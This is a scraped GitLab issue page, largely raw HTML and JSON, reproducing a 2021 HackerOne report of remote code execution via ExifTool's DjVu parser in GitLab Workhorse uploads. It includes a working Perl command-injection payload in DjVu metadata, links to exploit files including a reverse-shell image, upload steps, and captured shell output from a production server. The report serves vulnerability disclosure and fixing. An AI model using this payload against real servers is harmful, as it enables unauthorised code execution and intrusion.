class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     24237  0.0  0.0 288904 59208 ?        Sl   Mar10   6:50 /opt/td-agent/bin/ruby /opt/td-agent/bin/fluentd --log /var/log/td-agent/td-agent.log --daemon /var/run/td-agent/td-agent.pid  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC269\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     24242 20.6  0.5 3044156 391860 ?      Sl   Mar10 8337:18 /opt/td-agent/bin/ruby -Eascii-8bit:ascii-8bit /opt/td-agent/bin/fluentd --log /var/log/td-agent/td-agent.log --daemon /var/run/td-agent/td-agent.pid --under-supervisor  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC270\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egit      24253 51.3  2.0 2857244 1349560 ?     Sl   12:29  23:03 puma: cluster worker 13: 7369 [gitlab-puma-worker]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC271\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     24667  0.1  0.0      0     0 ?        I    11:29   0:11 [kworker/u32:4]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC272\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     24911  0.0  0.0      0     0 ?        I    Apr06   0:00 [kworker/6:2]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC273\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     25156  0.2  0.0      0     0 ?        I    12:59   0:01 [kworker/u32:5]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC274\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     25516  0.0  0.0      0     0 ?        I    07:36   0:00 [kworker/1:1]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC275\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egit      25517 50.4  2.1 2870560 1443204 ?     Sl   12:30  21:58 puma: cluster worker 6: 7369 [gitlab-puma-worker]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC276\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egit      25521 49.9  1.8 2550792 1218900 ?     Sl   13:00   7:06 puma: cluster worker 4: 7369 [gitlab-puma-worker]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC277\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     25525  0.0  0.0      0     0 ?        I    07:36   0:00 [kworker/3:2]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC278\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     25527  0.0  0.0      0     0 ?        I    07:36   0:00 [kworker/15:2]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC279\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     26983  0.0  0.0      0     0 ?        I    Apr06   0:00 [kworker/10:2]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC280\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     27893  0.0  0.0      0     0 ?        I\u0026lt;    2020   0:00 [xfsalloc]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC281\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     27894  0.0  0.0      0     0 ?        I\u0026lt;    2020   0:00 [xfs_mru_cache]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC282\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egit      28051 49.9  1.8 2635012 1248076 ?     Sl   13:03   5:34 puma: cluster worker 11: 7369 [gitlab-puma-worker]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC283\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egit      28140 50.3  2.1 2943756 1397844 ?     Sl   12:33  20:26 puma: cluster worker 14: 7369 [gitlab-puma-worker]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC284\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egit      29132 49.0  2.0 3164444 1367952 ?     Sl   12:05  33:39 puma: cluster worker 1: 7369 [gitlab-puma-worker]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC285\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     30224  0.0  0.0      0     0 ?        I    06:02   0:00 [kworker/14:1]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC286\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     30233  0.0  0.0      0     0 ?        I    06:02   0:00 [kworker/0:1]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC287\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     31940  0.0  0.0 278944 10648 ?        Ssl   2020   6:14 /usr/lib/accountsservice/accounts-daemon  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC288\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     32135  0.1  0.0      0     0 ?        I    13:07   0:00 [kworker/u32:0]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC289\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     32388  0.0  0.0      0     0 ?        I    01:32   0:00 [kworker/4:0]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC290\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eroot     32453  5.3  0.0 1774984 40780 ?       Sl    2020 13156:17 /opt/prometheus/mtail/mtail -progs /opt/prometheus/mtail/progs -logs /var/log/apt/term.log,/var/log/syslog,/var/log/td-agent/td-agent.log,/var/log/gitlab/gitlab-rails/*.log,/var/log/gitlab/unicorn/unicorn_stderr.log,/var/log/gitlab/unicorn/unicorn_stdout.log -logtostderr  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC291\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egit      32635 49.4  2.1 3154204 1401116 ?     Sl   12:09  31:54 puma: cluster worker 12: 7369 [gitlab-puma-worker]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC292\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003egit      32703 48.7  1.8 2402308 1195496 ?     Sl   13:08   3:01 puma: cluster worker 7: 7369 [gitlab-puma-worker]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC293\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eexit  \u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003ch5 data-sourcepos=\&quot;332:1-332:15\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-impact\&quot; class=\&quot;anchor\&quot; href=\&quot;#impact\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eImpact\u003c/h5\u003e\u0026#x000A;\u003cul data-sourcepos=\&quot;333:1-334:0\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;333:1-334:0\&quot;\u003eAnyone with the ability to upload an image that goes through the GitLab Workhorse could achieve RCE via a specially crafted file\u003c/li\u003e\u0026#x000A;\u003c/ul\u003e\u0026#x000A;\u003ch5 data-sourcepos=\&quot;335:1-335:17\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-examples\&quot; class=\&quot;anchor\&quot; href=\&quot;#examples\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eExamples\u003c/h5\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;336:1-337:112\&quot; dir=\&quot;auto\&quot;\u003e\u003ca class=\&quot;no-attachment-icon\&quot; href=\&quot;https://user-content.gitlab-static.net/f4983715beaa9e82a87dab3b009c11a1eb181511/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f64646163373265392d353161332d346430322d396435332d3137303966353032636637312f6563686f5f76616b7a7a2e6a70672e7a6970\&quot; target=\&quot;_blank\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/ddac72e9-51a3-4d02-9d53-1709f502cf71/echo_vakzz.jpg.zip\&quot;\u003e\u003cimg data-sourcepos=\&quot;336:1-336:106\&quot; src=\&quot;data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==\&quot; alt=\&quot;echo_vakzz.jpg.zip\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/ddac72e9-51a3-4d02-9d53-1709f502cf71/echo_vakzz.jpg.zip\&quot; decoding=\&quot;async\&quot; class=\&quot;lazy\&quot; data-src=\&quot;https://user-content.gitlab-static.net/f4983715beaa9e82a87dab3b009c11a1eb181511/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f64646163373265392d353161332d346430322d396435332d3137303966353032636637312f6563686f5f76616b7a7a2e6a70672e7a6970\&quot;\u003e\u003c/a\u003e\u003cbr data-sourcepos=\&quot;336:109-336:109\&quot;\u003e\u0026#x000A;\u003ca class=\&quot;no-attachment-icon\&quot; href=\&quot;https://user-content.gitlab-static.net/aa6b0ce079a3d047fd65797e65533920122451cf/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f61353237346262372d646633392d343939612d396337612d6538343039313434636631362f726576657273655f7368656c6c2e6a70672e7a6970\&quot; target=\&quot;_blank\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/a5274bb7-df39-499a-9c7a-e8409144cf16/reverse_shell.jpg.zip\&quot;\u003e\u003cimg data-sourcepos=\&quot;337:1-337:112\&quot; src=\&quot;data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==\&quot; alt=\&quot;reverse_shell.jpg.zip\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/a5274bb7-df39-499a-9c7a-e8409144cf16/reverse_shell.jpg.zip\&quot; decoding=\&quot;async\&quot; class=\&quot;lazy\&quot; data-src=\&quot;https://user-content.gitlab-static.net/aa6b0ce079a3d047fd65797e65533920122451cf/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f61353237346262372d646633392d343939612d396337612d6538343039313434636631362f726576657273655f7368656c6c2e6a70672e7a6970\&quot;\u003e\u003c/a\u003e\u003c/p\u003e\u0026#x000A;\u003ch5 data-sourcepos=\&quot;339:1-339:44\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-what-is-the-current-bug-behavior\&quot; class=\&quot;anchor\&quot; href=\&quot;#what-is-the-current-bug-behavior\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eWhat is the current \u003cem data-sourcepos=\&quot;339:28-339:32\&quot;\u003ebug\u003c/em\u003e behavior?\u003c/h5\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;340:1-340:177\&quot; dir=\&quot;auto\&quot;\u003eGitLab Workhorse will pass any file to ExifTool, greatly increasing the attack surface. The current bug is in the DjVu module of \u003ccode data-sourcepos=\&quot;340:131-340:138\&quot;\u003eExifTool\u003c/code\u003e which should ideally not ever be hit.\u003c/p\u003e\u0026#x000A;\u003ch5 data-sourcepos=\&quot;342:1-342:49\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-what-is-the-expected-correct-behavior\&quot; class=\&quot;anchor\&quot; href=\&quot;#what-is-the-expected-correct-behavior\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eWhat is the expected \u003cem data-sourcepos=\&quot;342:29-342:37\&quot;\u003ecorrect\u003c/em\u003e behavior?\u003c/h5\u003e\u0026#x000A;\u003cul data-sourcepos=\&quot;343:1-346:0\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;343:1-343:77\&quot;\u003eThere must be better ways of convert C escape sequences than using \u003ccode data-sourcepos=\&quot;343:71-343:74\&quot;\u003eeval\u003c/code\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;344:1-344:49\&quot;\u003eOnly the TIFF and JPEG modules should be used\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;345:1-346:0\&quot;\u003eGitLab Workhorse could check if the file is a valid TIFF of JPEG before passing it to ExifTool\u003c/li\u003e\u0026#x000A;\u003c/ul\u003e\u0026#x000A;\u003ch5 data-sourcepos=\&quot;347:1-347:25\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-output-of-checks\&quot; class=\&quot;anchor\&quot; href=\&quot;#output-of-checks\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eOutput of checks\u003c/h5\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;348:1-348:30\&quot; dir=\&quot;auto\&quot;\u003eThis bug happens on GitLab.com\u003c/p\u003e\u0026#x000A;\u003ch6 data-sourcepos=\&quot;350:1-350:44\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-results-of-gitlab-environment-info\&quot; class=\&quot;anchor\&quot; href=\&quot;#results-of-gitlab-environment-info\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eResults of GitLab environment info\u003c/h6\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;351:1-387:3\&quot; class=\&quot;code highlight js-syntax-highlight language-plaintext\&quot; lang=\&quot;plaintext\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eSystem information  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eSystem:  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC3\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eProxy:\t\tno  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC4\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eCurrent User:\tgit  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC5\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eUsing RVM:\tno  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC6\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eRuby Version:\t2.7.2p137  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC7\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eGem Version:\t3.1.4  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC8\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eBundler Version:2.1.4  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC9\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eRake Version:\t13.0.3  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC10\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eRedis Version:\t6.0.10  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC11\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eGit Version:\t2.29.0  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC12\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eSidekiq Version:5.2.9  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC13\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eGo Version:\tunknown\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC14\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC15\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eGitLab information  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC16\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eVersion:\t13.10.2-ee  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC17\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eRevision:\tcc4224220e6  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC18\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eDirectory:\t/opt/gitlab/embedded/service/gitlab-rails  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC19\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eDB Adapter:\tPostgreSQL  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC20\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eDB Version:\t12.6  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC21\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eURL:\t\thttp://192.168.0.127:9080  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC22\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eHTTP Clone URL:\thttp://192.168.0.127:9080/some-group/some-project.git  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC23\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eSSH Clone URL:\tgit@192.168.0.127:some-group/some-project.git  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC24\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eElasticsearch:\tno  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC25\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eGeo:\t\tno  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC26\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eUsing LDAP:\tno  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC27\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eUsing Omniauth:\tyes  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC28\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eOmniauth Providers:\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC29\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC30\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eGitLab Shell  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC31\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eVersion:\t13.17.0  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC32\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eRepository storage paths:  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC33\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e- default: \t/var/opt/gitlab/git-data/repositories  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC34\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eGitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC35\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eGit:\t\t/opt/gitlab/embedded/bin/git  \u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003ch4 data-sourcepos=\&quot;389:1-389:12\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-impact-1\&quot; class=\&quot;anchor\&quot; href=\&quot;#impact-1\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eImpact\u003c/h4\u003e\u0026#x000A;\u003cul data-sourcepos=\&quot;391:1-392:0\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;391:1-392:0\&quot;\u003eAnyone with the ability to upload an image that goes through the GitLab Workhorse could achieve RCE via a specially crafted file\u003c/li\u003e\u0026#x000A;\u003c/ul\u003e\u0026#x000A;\u003ch2 data-sourcepos=\&quot;393:1-393:14\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-attachments\&quot; class=\&quot;anchor\&quot; href=\&quot;#attachments\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eAttachments\u003c/h2\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;395:1-395:77\&quot; dir=\&quot;auto\&quot;\u003e\u003cstrong data-sourcepos=\&quot;395:1-395:12\&quot;\u003eWarning:\u003c/strong\u003e Attachments received through HackerOne, please exercise caution!\u003c/p\u003e\u0026#x000A;\u003cul data-sourcepos=\&quot;397:1-399:0\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;397:1-397:107\&quot;\u003e\u003ca data-sourcepos=\&quot;397:3-397:107\&quot; href=\&quot;https://h1.sec.gitlab.net/a/ddac72e9-51a3-4d02-9d53-1709f502cf71/echo_vakzz.jpg.zip\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003eecho_vakzz.jpg.zip\u003c/a\u003e\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;398:1-399:0\&quot;\u003e\u003ca data-sourcepos=\&quot;398:3-398:113\&quot; href=\&quot;https://h1.sec.gitlab.net/a/a5274bb7-df39-499a-9c7a-e8409144cf16/reverse_shell.jpg.zip\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003ereverse_shell.jpg.zip\u003c/a\u003e\u003c/li\u003e\u0026#x000A;\u003c/ul\u003e\u0026#x000A;\u003ch2 data-sourcepos=\&quot;400:1-400:19\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-how-to-reproduce\&quot; class=\&quot;anchor\&quot; href=\&quot;#how-to-reproduce\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eHow To Reproduce\u003c/h2\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;402:1-402:57\&quot; dir=\&quot;auto\&quot;\u003ePlease add \u003ca data-sourcepos=\&quot;402:12-402:40\&quot; href=\&quot;https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003ereproducibility information\u003c/a\u003e to this section:\u003c/p\u003e\u0026#x000A;\u003col data-sourcepos=\&quot;404:1-407:0\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;404:1-404:2\&quot;\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;405:1-405:2\&quot;\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;406:1-406:2\&quot;\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003c/ol\u003e&quot;,&quot;initialDescriptionText&quot;:&quot;**[HackerOne report #1154542](https://hackerone.com/reports/1154542)** by `vakzz` on 2021-04-07:\n\n[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)\n\n## Report\n\n#####  Summary  \nWhen uploading image files, GitLab Workhorse passes any files with the extensions [jpg|jpeg|tiff](https://gitlab.com/gitlab-org/gitlab/-/blob/v13.10.2-ee/workhorse/internal/upload/exif/exif.go#L104) through to [ExifTool](https://exiftool.org/) to remove any non-whitelisted tags.\n\nAn issue with this is that ExifTool will ignore the file extension and try to determine what the file is based on the content, allowing for any of the supported parsers to be hit instead of just JPEG and TIFF by just renaming the uploaded file.\n\nOne of the supported formats is [DjVu](https://github.com/exiftool/exiftool/blob/11.70/lib/Image/ExifTool/DjVu.pm). When parsing the DjVu annotation, the [tokens are evaled](https://github.com/exiftool/exiftool/blob/11.70/lib/Image/ExifTool/DjVu.pm#L233) to \&quot;convert C escape sequences\&quot;. \n\nThere is some validation to try and ensure that everything is properly escaped, but a backslash followed by a newline is correctly handled allowing the quotes to be closed and arbitrary perl inserted and evaluated:\n\n```  \n(metadata  \n\t(Copyright \&quot;\\  \n\&quot; . qx{echo vakzz \u003e/tmp/vakzz} . \\  \n\&quot; b \&quot;) )  \n```\n\n![echo_vakzz.jpg.zip](https://h1.sec.gitlab.net/a/ddac72e9-51a3-4d02-9d53-1709f502cf71/echo_vakzz.jpg.zip) is an example DjVu file with the above metadata, and ![reverse_shell.jpg.zip](https://h1.sec.gitlab.net/a/a5274bb7-df39-499a-9c7a-e8409144cf16/reverse_shell.jpg.zip) is an example that runs a reverse shell.\n\n#####  Steps to reproduce  \n1. Download ![echo_vakzz.jpg.zip](https://h1.sec.gitlab.net/a/ddac72e9-51a3-4d02-9d53-1709f502cf71/echo_vakzz.jpg.zip) and unzip it  \n1. Create a new snippet  \n1. In the description field, hit \&quot;Attach a file\&quot;  \n1. Select and uplaod `echo_vakzz.jpg`  \n1. See that the file `/tmp/vakzz` has been created on the server\n\n\nUploading ![reverse_shell.jpg.zip](https://h1.sec.gitlab.net/a/a5274bb7-df39-499a-9c7a-e8409144cf16/reverse_shell.jpg.zip) to https://gitlab.com/-/snippets/new resulted in a shell on `web-09-sv-gprd`:\n\n```  \nConnection from [34.74.90.73] port 12345 [tcp/*] accepted (family 2, sport 17073)  \nid  \nuid=500(git) gid=500(git) groups=500(git)  \nhostname -a  \nweb-09-sv-gprd  \nps auxww  \nUSER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND  \nroot         1  0.0  0.0 185524  5496 ?        Ss    2020  28:31 /sbin/init  \nroot         2  0.0  0.0      0     0 ?        S     2020   1:44 [kthreadd]  \nroot         4  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kworker/0:0H]  \nroot         6  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [mm_percpu_wq]  \nroot         7  0.0  0.0      0     0 ?        S     2020  22:50 [ksoftirqd/0]  \nroot         8  0.1  0.0      0     0 ?        I     2020 552:25 [rcu_sched]  \nroot         9  0.0  0.0      0     0 ?        I     2020   0:00 [rcu_bh]  \nroot        10  0.0  0.0      0     0 ?        S     2020   1:05 [migration/0]  \nroot        11  0.0  0.0      0     0 ?        S     2020   1:05 [watchdog/0]  \nroot        12  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/0]  \nroot        13  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/1]  \nroot        14  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/1]  \nroot        15  0.0  0.0      0     0 ?        S     2020   1:03 [migration/1]  \nroot        16  0.0  0.0      0     0 ?        S     2020  20:27 [ksoftirqd/1]  \nroot        18  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kworker/1:0H]  \nroot        19  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/2]  \nroot        20  0.0  0.0      0     0 ?        S     2020   1:05 [watchdog/2]  \nroot        21  0.0  0.0      0     0 ?        S     2020   1:04 [migration/2]  \nroot        22  0.0  0.0      0     0 ?        S     2020  18:14 [ksoftirqd/2]  \nroot        24  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kworker/2:0H]  \nroot        25  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/3]  \nroot        26  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/3]  \nroot        27  0.0  0.0      0     0 ?        S     2020   1:05 [migration/3]  \nroot        28  0.0  0.0      0     0 ?        S     2020  17:57 [ksoftirqd/3]  \nroot        30  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kworker/3:0H]  \nroot        31  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/4]  \nroot        32  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/4]  \nroot        33  0.0  0.0      0     0 ?        S     2020   1:05 [migration/4]  \nroot        34  0.0  0.0      0     0 ?        S     2020  17:09 [ksoftirqd/4]  \nroot        36  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kworker/4:0H]  \nroot        37  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/5]  \nroot        38  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/5]  \nroot        39  0.0  0.0      0     0 ?        S     2020   1:05 [migration/5]  \nroot        40  0.0  0.0      0     0 ?        S     2020  16:56 [ksoftirqd/5]  \nroot        42  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kworker/5:0H]  \nroot        43  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/6]  \nroot        44  0.0  0.0      0     0 ?        S     2020   1:05 [watchdog/6]  \nroot        45  0.0  0.0      0     0 ?        S     2020   1:05 [migration/6]  \nroot        46  0.0  0.0      0     0 